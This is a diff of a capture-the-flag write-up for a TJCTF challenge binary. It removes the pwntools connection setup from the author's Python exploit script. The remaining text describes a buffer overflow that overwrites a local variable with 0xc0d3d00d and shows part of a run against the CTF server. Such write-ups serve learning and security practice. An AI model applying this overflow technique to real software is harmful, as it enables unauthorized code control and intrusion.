@@ -86,24 +86,6 @@ The executable asks for four inputs, Name, Username, Password, and Tinder Bio. I
 I made a python script to overwrite local_14 with `0xc0d3d00d`. I decided to use the final input for whatever reason. I overwrote all the other string buffers and the file pointer with passing to get to `local_14`. Then, all that's left is to overwrite `local_14` with `0xc0d3d00d`.
 
 ```python
-from pwn import *
-
-if 'rem' in sys.argv:
-    r = remote('p1.tjctf.org', 8002)
-elif 'file' in sys.argv:
-    class getPayload:
-        def __init__(self):
-            self.payload = b''
-        def send(self, oper):
-            self.payload += oper
-        def interactive(self):
-            file = open('payload', 'wb')
-            file.write(self.payload)
-            file.close()
-    r = getPayload()
-else:
-    r = process('./match')
-
 for i in range(3):
     r.send(b'a\n')
 
@@ -133,7 +115,7 @@ filler = b'A' * (64 + 16 + 16 + 16 + 4)
 
 Now that I think about it, that may have been smarter.
 
-```python
+```
 $ py sol.py rem
 [+] Opening connection to p1.tjctf.org on port 8002: Done
 [*] Switching to interactive mode
